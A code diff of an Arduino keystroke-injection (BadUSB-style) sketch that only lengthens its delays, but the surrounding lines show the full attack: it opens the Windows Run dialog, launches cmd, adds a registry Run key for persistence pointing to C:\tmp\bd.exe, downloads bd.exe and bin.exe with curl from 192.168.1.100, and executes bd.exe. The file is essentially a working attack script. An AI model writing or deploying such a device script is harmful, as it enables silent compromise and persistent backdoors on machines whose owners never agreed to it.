@@ -17,52 +17,51 @@ void setup()
   // Begining the Keyboard stream
   Keyboard.begin();
 
-  // Wait 500ms
-  delay(500);
+  // Wait 1000ms
+  delay(1000);
 
-  delay(400);
-
+  delay(1000);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("cmd");
   typeKey(KEY_RETURN);
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v acid /t REG_SZ /d C:\\tmp\\bd.exe");
   typeKey(KEY_RETURN);
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("md C:\\tmp");
   typeKey(KEY_RETURN);
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("cd C:\\tmp");
   typeKey(KEY_RETURN);
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("curl http://192.168.1.100/bd.exe -O bd.exe");
   typeKey(KEY_RETURN);
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("curl http://192.168.1.100/bin.exe -O bin.exe");
   typeKey(KEY_RETURN);
   
 
-  delay(100);
+  delay(1000);
   Keyboard.print("bd.exe");
   typeKey(KEY_RETURN);
 
 
-  delay(100);
+  delay(1000);
   Keyboard.print("exit");
   typeKey(KEY_RETURN);
 
